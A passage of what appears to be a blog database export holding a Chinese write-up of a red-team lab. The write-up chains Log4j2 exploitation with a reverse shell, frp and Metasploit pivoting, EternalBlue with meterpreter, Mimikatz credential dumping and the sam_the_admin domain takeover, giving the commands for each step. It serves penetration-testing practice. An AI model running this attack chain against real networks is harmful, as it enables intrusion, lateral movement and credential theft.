4444\n```\n\n![](https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png)\n\n使用EXP成功反弹shell\n\n![](https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png)\n\n当前的shell是一个Docker环境\n\n![](https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png)\n\n![](https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png)\n\n在`/root/\t`目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的`SSH`的账号密码\n\n![](https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png)\n\n## 内网信息收集\n\n使用获得的账号密码成功登录`SSH`服务\n\n![](https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png)\n\n`ifconfig`发现该机器有双网卡，其中 `ens33` 是外网的网卡，`ens38` （10.0.1.6）是内网网卡\n\n![](https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png)\n\n我们用 `for` 循环 `ping` 一下 `ens38` 的 `C` 段：\n\n```\nfor i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i Find the target; fi; done\n```\n\n发现有一台存活主机`10.0.1.7`\n\n![](https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png)\n\n## 内网横向渗透\n\n### frp流量转发\n\n使用[**frp**](https://github.com/fatedier/frp)将已获取到权限的`Ubuntu`的流量代理出来，这样就可以通过`Kali`来对内网存活主机进行渗透了\n\n我们先要将`frp`上传到`Ubuntu`中，在`Kali`开启一个`HTTP`服务\n\n```\npython3 -m http.server 80\n```\n\n![](https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png)\n\n然后在`Ubuntu`中下载\n\n![](https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png)\n\n在`Ubuntu`中给予`frp.tar.gz`执行权限，并解压\n\n```\nchmod +x frp.tar.gz\ntar -zxvf frp.tar.gz\n```\n\n![](https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png)\n\n进入`frp`目录，配置好`frpc.ini`\n\n![](https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png)\n\n然后回到`Kali`终端开启`frp`的服务端\n\n![](https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png)\n\n再在`Ubuntu`中启动客户端\n\n![](https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png)\n\n此时`Kali`的服务端就有响应了\n\n![](https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png)\n\n### MSF设置Socks 代理\n\n```\nsetg Proxies socks5:192.168.124.7:7777\nsetg ReverseAllowProxy true\n```\n\n![](https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png)\n\n使用 `smb` 版本探测模块对目标进行扫描：\n\n```\nuse auxiliary/scanner/smb/smb_version\nset rhosts 10.0.1.7\n```\n\n![](https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png)\n\n发现目标 `10.0.1.7`系统 版本是 `Windows 7`，且存在域 `REDTEAM`\n\n接着探测目标是否存在经典的`MS17-010`漏洞\n\n### MS17-010 漏洞探测与利用\n\n```\nuse auxiliary/scanner/smb/smb_ms17_010\nset rhosts 10.0.1.7\n```\n\n![](https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png)\n\n目标主机`win7`确实存在`永恒之蓝`漏洞\n\n接下来我们继续使用`MSF`的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的`payload`\n\n```\nuse windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 10.0.1.7\nrun\n```\n\n<img src=\"https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png\" style=\"zoom: 80%;\" />\n\n成功获得一个`meterpreter`\n\n![](https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png)\n\n拿到 `Win7` 权限后加载 `Mimikatz` 抓取明文密码\n\n```\nload mimikatz\ncreds_all\n```\n\n![](https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png)\n\n此时我们得到了一个域用户的账号密码\n\n## 域渗透\n\n### 域内信息收集\n\n```\nhostname\nnet user /domain\nipconfig\n```\n\n![](https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png)\n\n![](https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png)\n\n发现`win7`还有一个内网网卡，接着我们需要定位域控\n\n```\nnet group \"Domain Controllers\" /domain\nping DC\n```\n\n![](https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png)\n\n定位到域控到域控 `IP` 为 `10.0.0.12` ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278\n\n**具体：**[只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）](https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect)\n\n### MSF流量转发\n\n我们先将`win7`的流量代理出来，然后在`Kali`中实现域内提权\n\n先添加路由：\n\n```\nrun autoroute -s 10.0.0.7/24\n```\n\n![](https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png)\n\n使用 MSF 添加了一个 Socks：\n\n```\nbackground\nuse auxiliary/server/socks_proxy\nrun\n```\n\n![](https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png)\n\n接着修改`proxychain`配置文件\n\n```\nvim /etc/proxychains4.conf\n```\n\n![](https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png)\n\n直接使用[脚本](https://github.com/WazeHell/sam-the-admin)利用漏洞进行域内提权\n\n```\nproxychains python3 sam_the_admin.py \"redteam/root:Red12345\" -dc-ip 10.0.0.12 -shell\n```\n\n![](https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png)\n\n最后拿到最终的flag\n\n![](https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png)\n","slug":"渗透攻击红队域渗透靶场-2-redteam-lab-Writeup","published":1,"updated":"2021-12-25T12:47:18.008Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyr001dwku10rtgeymm","content":"<pre><code>知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理\n</code></pre>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png\"></p>\n<p>PS：靶场下载地址关注微信公众号：<strong>红队攻防实验室</strong> 回复：<strong>001</strong> 即可获取到下载地址。</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><pre><code>Ubuntu Desktop ip：192.168.124.8（模拟服务器公网ip）\nKali ip：192.168.124.7\n</code></pre>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><pre><code>nmap -sC -sV -p- 192.168.124.8\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png\"></p>\n<p>一台Ubuntu机器，开放了两个端口<code>22</code>、<code>38080</code></p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p><code>22</code>端口暂时无法利用，先访问<code>38080</code>端口</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png\"></p>\n<p>是一个web服务，直接尝试最近爆出的<code>CVE-2021-44228</code>Log4j2 rce漏洞，看看能不能获取到 <code>dnslog</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png\"></p>\n<p>发现存在<code>CVE-2021-44228</code>log4j2 rce漏洞。接下来利用该漏洞反弹shell</p>\n<h2 id=\"CVE-2021-44228漏洞利用\"><a href=\"#CVE-2021-44228漏洞利用\" class=\"headerlink\" title=\"CVE-2021-44228漏洞利用\"></a>CVE-2021-44228漏洞利用</h2><p>使用<a href=\"https://github.com/feihong-cs/JNDIExploit\">工具</a>在<strong>Kali</strong>终端（192.168.124.7）开启一个LDAP：</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png\"></p>\n<p>并开启一个监听端口，来接收反弹的shell</p>\n<pre><code>nc -lnvp 4444\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png\"></p>\n<p>使用EXP成功反弹shell</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png\"></p>\n<p>当前的shell是一个Docker环境</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png\"></p>\n<p>在<code>/root/    </code>目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的<code>SSH</code>的账号密码</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png\"></p>\n<h2 id=\"内网信息收集\"><a href=\"#内网信息收集\" class=\"headerlink\" title=\"内网信息收集\"></a>内网信息收集</h2><p>使用获得的账号密码成功登录<code>SSH</code>服务</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png\"></p>\n<p><code>ifconfig</code>发现该机器有双网卡，其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png\"></p>\n<p>我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p>\n<pre><code>for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done\n</code></pre>\n<p>发现有一台存活主机<code>10.0.1.7</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png\"></p>\n<h2 id=\"内网横向渗透\"><a href=\"#内网横向渗透\" class=\"headerlink\" title=\"内网横向渗透\"></a>内网横向渗透</h2><h3 id=\"frp流量转发\"><a href=\"#frp流量转发\" class=\"headerlink\" title=\"frp流量转发\"></a>frp流量转发</h3><p>使用<a href=\"https://github.com/fatedier/frp\"><strong>frp</strong></a>将已获取到权限的<code>Ubuntu</code>的流量代理出来，这样就可以通过<code>Kali</code>来对内网存活主机进行渗透了</p>\n<p>我们先要将<code>frp</code>上传到<code>Ubuntu</code>中，在<code>Kali</code>开启一个<code>HTTP</code>服务</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png\"></p>\n<p>然后在<code>Ubuntu</code>中下载</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png\"></p>\n<p>在<code>Ubuntu</code>中给予<code>frp.tar.gz</code>执行权限，并解压</p>\n<pre><code>chmod +x frp.tar.gz\ntar -zxvf frp.tar.gz\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png\"></p>\n<p>进入<code>frp</code>目录，配置好<code>frpc.ini</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png\"></p>\n<p>然后回到<code>Kali</code>终端开启<code>frp</code>的服务端</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png\"></p>\n<p>再在<code>Ubuntu</code>中启动客户端</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png\"></p>\n<p>此时<code>Kali</code>的服务端就有响应了</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png\"></p>\n<h3 id=\"MSF设置Socks-代理\"><a href=\"#MSF设置Socks-代理\" class=\"headerlink\" title=\"MSF设置Socks 代理\"></a>MSF设置Socks 代理</h3><pre><code>setg Proxies socks5:192.168.124.7:7777\nsetg ReverseAllowProxy true\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png\"></p>\n<p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p>\n<pre><code>use auxiliary/scanner/smb/smb_version\nset rhosts 10.0.1.7\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png\"></p>\n<p>发现目标 <code>10.0.1.7</code>系统 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code></p>\n<p>接着探测目标是否存在经典的<code>MS17-010</code>漏洞</p>\n<h3 id=\"MS17-010-漏洞探测与利用\"><a href=\"#MS17-010-漏洞探测与利用\" class=\"headerlink\" title=\"MS17-010 漏洞探测与利用\"></a>MS17-010 漏洞探测与利用</h3><pre><code>use auxiliary/scanner/smb/smb_ms17_010\nset rhosts 10.0.1.7\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png\"></p>\n<p>目标主机<code>win7</code>确实存在<code>永恒之蓝</code>漏洞</p>\n<p>接下来我们继续使用<code>MSF</code>的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的<code>payload</code></p>\n<pre><code>use windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 10.0.1.7\nrun\n</code></pre>\n<img src=\"https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png\" style=\"zoom: 80%;\" />\n\n<p>成功获得一个<code>meterpreter</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png\"></p>\n<p>拿到 <code>Win7</code> 权限后加载 <code>Mimikatz</code> 抓取明文密码</p>\n<pre><code>load mimikatz\ncreds_all\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png\"></p>\n<p>此时我们得到了一个域用户的账号密码</p>\n<h2 id=\"域渗透\"><a href=\"#域渗透\" class=\"headerlink\" title=\"域渗透\"></a>域渗透</h2><h3 id=\"域内信息收集\"><a href=\"#域内信息收集\" class=\"headerlink\" title=\"域内信息收集\"></a>域内信息收集</h3><pre><code>hostname\nnet user /domain\nipconfig\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png\"></p>\n<p>发现<code>win7</code>还有一个内网网卡，接着我们需要定位域控</p>\n<pre><code>net group &quot;Domain Controllers&quot; /domain\nping DC\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png\"></p>\n<p>定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278</p>\n<p><strong>具体：</strong><a href=\"https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect\">只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）</a></p>\n<h3 id=\"MSF流量转发\"><a href=\"#MSF流量转发\" class=\"headerlink\" title=\"MSF流量转发\"></a>MSF流量转发</h3><p>我们先将<code>win7</code>的流量代理出来，然后在<code>Kali</code>中实现域内提权</p>\n<p>先添加路由：</p>\n<pre><code>run autoroute -s 10.0.0.7/24\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png\"></p>\n<p>使用 MSF 添加了一个 Socks：</p>\n<pre><code>background\nuse auxiliary/server/socks_proxy\nrun\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png\"></p>\n<p>接着修改<code>proxychain</code>配置文件</p>\n<pre><code>vim /etc/proxychains4.conf\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png\"></p>\n<p>直接使用<a href=\"https://github.com/WazeHell/sam-the-admin\">脚本</a>利用漏洞进行域内提权</p>\n<pre><code>proxychains python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png\"></p>\n<p>最后拿到最终的flag</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<pre><code>知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理\n</code></pre>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png\"></p>\n<p>PS：靶场下载地址关注微信公众号：<strong>红队攻防实验室</strong> 回复：<strong>001</strong> 即可获取到下载地址。</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><pre><code>Ubuntu Desktop ip：192.168.124.8（模拟服务器公网ip）\nKali ip：192.168.124.7\n</code></pre>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><pre><code>nmap -sC -sV -p- 192.168.124.8\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png\"></p>\n<p>一台Ubuntu机器，开放了两个端口<code>22</code>、<code>38080</code></p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p><code>22</code>端口暂时无法利用，先访问<code>38080</code>端口</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png\"></p>\n<p>是一个web服务，直接尝试最近爆出的<code>CVE-2021-44228</code>Log4j2 rce漏洞，看看能不能获取到 <code>dnslog</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png\"></p>\n<p>发现存在<code>CVE-2021-44228</code>log4j2 rce漏洞。接下来利用该漏洞反弹shell</p>\n<h2 id=\"CVE-2021-44228漏洞利用\"><a href=\"#CVE-2021-44228漏洞利用\" class=\"headerlink\" title=\"CVE-2021-44228漏洞利用\"></a>CVE-2021-44228漏洞利用</h2><p>使用<a href=\"https://github.com/feihong-cs/JNDIExploit\">工具</a>在<strong>Kali</strong>终端（192.168.124.7）开启一个LDAP：</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png\"></p>\n<p>并开启一个监听端口，来接收反弹的shell</p>\n<pre><code>nc -lnvp 4444\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png\"></p>\n<p>使用EXP成功反弹shell</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png\"></p>\n<p>当前的shell是一个Docker环境</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png\"></p>\n<p>在<code>/root/    </code>目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的<code>SSH</code>的账号密码</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png\"></p>\n<h2 id=\"内网信息收集\"><a href=\"#内网信息收集\" class=\"headerlink\" title=\"内网信息收集\"></a>内网信息收集</h2><p>使用获得的账号密码成功登录<code>SSH</code>服务</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png\"></p>\n<p><code>ifconfig</code>发现该机器有双网卡，其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png\"></p>\n<p>我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p>\n<pre><code>for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done\n</code></pre>\n<p>发现有一台存活主机<code>10.0.1.7</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png\"></p>\n<h2 id=\"内网横向渗透\"><a href=\"#内网横向渗透\" class=\"headerlink\" title=\"内网横向渗透\"></a>内网横向渗透</h2><h3 id=\"frp流量转发\"><a href=\"#frp流量转发\" class=\"headerlink\" title=\"frp流量转发\"></a>frp流量转发</h3><p>使用<a href=\"https://github.com/fatedier/frp\"><strong>frp</strong></a>将已获取到权限的<code>Ubuntu</code>的流量代理出来，这样就可以通过<code>Kali</code>来对内网存活主机进行渗透了</p>\n<p>我们先要将<code>frp</code>上传到<code>Ubuntu</code>中，在<code>Kali</code>开启一个<code>HTTP</code>服务</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png\"></p>\n<p>然后在<code>Ubuntu</code>中下载</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png\"></p>\n<p>在<code>Ubuntu</code>中给予<code>frp.tar.gz</code>执行权限，并解压</p>\n<pre><code>chmod +x frp.tar.gz\ntar -zxvf frp.tar.gz\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png\"></p>\n<p>进入<code>frp</code>目录，配置好<code>frpc.ini</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png\"></p>\n<p>然后回到<code>Kali</code>终端开启<code>frp</code>的服务端</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png\"></p>\n<p>再在<code>Ubuntu</code>中启动客户端</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png\"></p>\n<p>此时<code>Kali</code>的服务端就有响应了</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png\"></p>\n<h3 id=\"MSF设置Socks-代理\"><a href=\"#MSF设置Socks-代理\" class=\"headerlink\" title=\"MSF设置Socks 代理\"></a>MSF设置Socks 代理</h3><pre><code>setg Proxies socks5:192.168.124.7:7777\nsetg ReverseAllowProxy true\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png\"></p>\n<p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p>\n<pre><code>use auxiliary/scanner/smb/smb_version\nset rhosts 10.0.1.7\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png\"></p>\n<p>发现目标 <code>10.0.1.7</code>系统 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code></p>\n<p>接着探测目标是否存在经典的<code>MS17-010</code>漏洞</p>\n<h3 id=\"MS17-010-漏洞探测与利用\"><a href=\"#MS17-010-漏洞探测与利用\" class=\"headerlink\" title=\"MS17-010 漏洞探测与利用\"></a>MS17-010 漏洞探测与利用</h3><pre><code>use auxiliary/scanner/smb/smb_ms17_010\nset rhosts 10.0.1.7\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png\"></p>\n<p>目标主机<code>win7</code>确实存在<code>永恒之蓝</code>漏洞</p>\n<p>接下来我们继续使用<code>MSF</code>的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的<code>payload</code></p>\n<pre><code>use windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp\nset rhosts 10.0.1.7\nrun\n</code></pre>\n<img src=\"https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png\" style=\"zoom: 80%;\" />\n\n<p>成功获得一个<code>meterpreter</code></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png\"></p>\n<p>拿到 <code>Win7</code> 权限后加载 <code>Mimikatz</code> 抓取明文密码</p>\n<pre><code>load mimikatz\ncreds_all\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png\"></p>\n<p>此时我们得到了一个域用户的账号密码</p>\n<h2 id=\"域渗透\"><a href=\"#域渗透\" class=\"headerlink\" title=\"域渗透\"></a>域渗透</h2><h3 id=\"域内信息收集\"><a href=\"#域内信息收集\" class=\"headerlink\" title=\"域内信息收集\"></a>域内信息收集</h3><pre><code>hostname\nnet user /domain\nipconfig\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png\"></p>\n<p><img src=\"https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png\"></p>\n<p>发现<code>win7</code>还有一个内网网卡，接着我们需要定位域控</p>\n<pre><code>net group &quot;Domain Controllers&quot; /domain\nping DC\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png\"></p>\n<p>定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278</p>\n<p><strong>具体：</strong><a href=\"https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect\">只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）</a></p>\n<h3 id=\"MSF流量转发\"><a href=\"#MSF流量转发\" class=\"headerlink\" title=\"MSF流量转发\"></a>MSF流量转发</h3><p>我们先将<code>win7</code>的流量代理出来，然后在<code>Kali</code>中实现域内提权</p>\n<p>先添加路由：</p>\n<pre><code>run autoroute -s 10.0.0.7/24\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png\"></p>\n<p>使用 MSF 添加了一个 Socks：</p>\n<pre><code>background\nuse auxiliary/server/socks_proxy\nrun\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png\"></p>\n<p>接着修改<code>proxychain</code>配置文件</p>\n<pre><code>vim /etc/proxychains4.conf\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png\"></p>\n<p>直接使用<a href=\"https://github.com/WazeHell/sam-the-admin\">脚本</a>利用漏洞进行域内提权</p>\n<pre><code>proxychains python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell\n</code></pre>\n<p><img src=\"https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png\"></p>\n<p>最后拿到最终的flag</p>\n<p><img src=\"https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png\"></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cl5up2nyc0006wku11mv9eo4r","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyf000ewku11lnngar7"},{"post_id":"cl5up2ny60001wku112am8y1q","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyh000jwku1f6st0hxy"},{"post_id":"cl5up2nyc0007wku12udq09b2","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyi000mwku141673zrp"},{"post_id":"cl5up2nye000bwku1d89q6i8t","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyj000rwku13yvng8qi"},{"post_id":"cl5up2ny80002wku1eeofejxn","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyk000twku14u572eey"},{"post_id":"cl5up2nyb0005wku14ue7g7va","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyk000wwku1avve5c1x"},{"post_id":"cl5up2nyi000lwku12n2vca1m","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyl000ywku1gx66dymb"},{"post_id":"cl5up2nyj000qwku1asi1hsv4","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nyl0010wku13s299wxl"},{"post_id":"cl5up2nyf000dwku1345jgzgg","category_id":"cl5up2nyi000nwku1eb8e6ghj","_id":"cl5up2nyl0012wku125jk9jil"},{"post_id":"cl5up2nyj000swku176xqgice","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nym0014wku16f8r7277"},{"post_id":"cl5up2nyg000iwku175kibbuw","category_id":"cl5up2nyk000uwku14rp6ffzw","_id":"cl5up2nym0016wku1agic6gxs"},{"post_id":"cl5up2nyr001cwku10ybg17cz","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nys001gwku180g46sjt"},{"post_id":"cl5up2nyr001dwku10rtgeymm","category_id":"cl5up2ny90003wku1decb3wce","_id":"cl5up2nys001hwku1hc6lfu4t"}],"PostTag":[{"post_id":"